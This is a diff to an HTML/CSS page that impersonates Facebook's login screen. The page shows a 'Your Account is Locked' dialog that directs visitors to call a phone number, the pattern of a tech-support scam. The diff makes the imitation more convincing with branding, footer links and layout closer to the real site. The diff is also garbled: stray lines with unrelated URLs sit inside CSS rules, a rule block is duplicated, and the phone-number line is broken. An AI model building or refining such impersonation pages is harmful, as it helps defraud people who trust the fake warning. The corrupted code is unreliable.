@@ -10,7 +10,7 @@
       padding: 0;
       height: 100vh;
       font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-      background: linear-gradient(to bottom, #f0f2f5, #ffffff);
+      background: #f0f2f5;
       overflow: hidden; /* Prevent scrolling */
     }
 
@@ -33,10 +33,11 @@
       padding: 10px 20px;
       display: flex;
       justify-content: center;
+      align-items: center;
     }
 
     .header img {
-      height: 40px;
+      height: 36px;
     }
 
     .content {
@@ -75,7 +76,6 @@
       box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
       padding: 20px;
       width: 100%;
-      Innocentware: https://innocentware.com/
       text-align: left;
     }
 
@@ -85,8 +85,15 @@
       margin-bottom: 10px;
       border: 1px solid #dddfe2;
       border-radius: 6px;
-      font-size: 16px;
+      font-size: 17px;
+      box-sizing: border-box;
       background: #f5f6f5;
+      transition: border-color 0.2s;
+    }
+
+    .login-form input:focus {
+      outline: none;
+      border-color: #1877f2;
     }
 
     .login-form button {
@@ -97,8 +104,9 @@
       border: none;
       border-radius: 6px;
       font-size: 20px;
-      font-weight: bold;
+      font-weight: 600;
       cursor: pointer;
+      transition: background-color 0.2s;
     }
 
     .login-form button:disabled {
@@ -106,12 +114,37 @@
       cursor: not-allowed;
     }
 
+    .login-form button:not(:disabled):hover {
+      background: #166fe5;
+    }
+
+    .forgot-password {
+      text-align: center;
+      margin-top: 16px;
+    }
+
+    .forgot-password a {
+      color: #1877f2;
+      font-size: 14px;
+      text-decoration: none;
+    }
+
+    .forgot-password a:hover {
+iframe: https://www.youtube.com/watch?v=5Z8H2CQo1dU
+      text-align: center;
+      margin-top: 16px;
+    }
+
+    .forgot-password a:hover {
+      text-decoration: underline;
+    }
+
     .dialog-box {
       background: #ffffff;
       border-radius: 8px;
       box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
-      width: 400px;
-      padding: 20px;
+      width: 432px;
+      padding: 24px;
       text-align: center;
       position: fixed;
       top: 50%;
@@ -120,28 +153,39 @@
       z-index: 1000;
     }
 
+    .profile-pic {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      margin: 0 auto 15px;
+      background: #e4e6eb;
+      border: 2px solid #ffffff;
+      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+    }
+
     .dialog-box h2 {
       color: #1c1e21;
       font-size: 20px;
+      font-weight: 600;
       margin-bottom: 15px;
     }
 
     .dialog-box p {
       color: #606770;
-      font-size: 16px;
+      font-size: 15px;
       line-height: 24px;
       margin-bottom: 20px;
     }
 
     .phone-number {
-      font-size: 18px;
+      font-size: 16px;
       font-weight: bold;
       color: #d32f2f;
       margin-top: 20px;
     }
 
     .facebook-logo {
-      width: 100px;
+      width: 32px;
       margin-bottom: 10px;
     }
 
@@ -152,18 +196,24 @@
       background: #ffffff;
       padding: 20px 0;
       text-align: center;
-      color: #737373;
+      color: #8a8d91;
       font-size: 12px;
+      border-top: 1px solid #dddfe2;
     }
 
     .footer a {
-      color: #737373;
+      color: #8a8d91;
       text-decoration: none;
-      margin: 0 10px;
+      margin: 0 8px;
     }
 
     .footer a:hover {
       text-decoration: underline;
+    }
+
+    .footer .languages,
+    .footer .links {
+      margin: 10px 0;
     }
 
     .overlay {
@@ -185,34 +235,80 @@
   <div class="container">
     <div class="content">
       <div class="left-section">
-        <h1>Facebook</h1>
+        <h1>facebook</h1>
         <p>Connect with friends and the world around you on Facebook.</p>
       </div>
       <div class="right-section">
         <div class="login-form">
-          <input type="text" placeholder="Email or Phone Number" disabled>
+          <input type="text" placeholder="Email or phone number" disabled>
           <input type="password" placeholder="Password" disabled>
           <button disabled>Log In</button>
+          <div class="forgot-password">
+            <a href="#">Forgot password?</a>
+          </div>
         </div>
       </div>
     </div>
   </div>
   <div class="dialog-box">
+    <div class="profile-pic"></div>
     <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="facebook-logo">
     <h2>Your Account is Locked</h2>
     <p>We detected unusual activity on your account. For your security, your account has been temporarily locked. Please contact our support team to regain access.</p>
-    <p class="phone-number">Call us at: 1-834-434-3483</p>
+    <p class="phone-number">Call us at: 1-834-434://www.youtube.com/watch?v=5Z8H2CQo1dU
+      Call us at: 1-834-434-3483
+    </p>
   </div>
   <div class="footer">
-    <p>
+    <div class="languages">
       <a href="#">English (US)</a>
       <a href="#">Español</a>
       <a href="#">Português (Brasil)</a>
       <a href="#">Français (France)</a>
-      <a href="#">More</a>
-      <br><br>
-      Sign Up · Log In · Messenger · Facebook Lite · Watch · Places · Games · Marketplace · Meta Pay · Meta Store · Meta Quest · Instagram · Fundraisers · Services · Voting Information Center · Privacy Policy · Terms · Cookies · Ad Choices · Careers · Help · Contact Uploading
-    </p>
+      <a href="#">Deutsch</a>
+      <a href="#">Italiano</a>
+      <a href="#">العربية</a>
+      <a href="#">हिन्दी</a>
+      <a href="#">中文(简体)</a>
+      <a href="#">日本語</a>
+      <a href="#">More...</a>
+    </div>
+    <div class="links">
+      <a href="#">Sign Up</a>
+      <a href="#">Log In</a>
+      <a href="#">Messenger</a>
+      <a href="#">Facebook Lite</a>
+      <a href="#">Watch</a>
+      <a href="#">People</a>
+      <a href="#">Profiles</a>
+      <a href="#">Pages</a>
+      <a href="#">Page categories</a>
+      <a href="#">Places</a>
+      <a href="#">Games</a>
+      <a href="#">Locations</a>
+      <a href="#">Marketplace</a>
+      <a href="#">Meta Pay</a>
+      <a href="#">Meta Store</a>
+      <a href="#">Meta Quest</a>
+      <a href="#">Meta AI</a>
+      <a href="#">Instagram</a>
+      <a href="#">Fundraisers</a>
+      <a href="#">Services</a>
+      <a href="#">Voting Information Center</a>
+      <a href="#">Groups</a>
+      <a href="#">About</a>
+      <a href="#">Create ad</a>
+      <a href="#">Create Page</a>
+      <a href="#">Developers</a>
+      <a href="#">Careers</a>
+      <a href="#">Privacy</a>
+      <a href="#">Cookies</a>
+      <a href="#">Ad choices</a>
+      <a href="#">Terms</a>
+      <a href="#">Help</a>
+      <a href="#">Contact uploading</a>
+    </div>
+    <p>Meta © 2025</p>
   </div>
 
   <script>
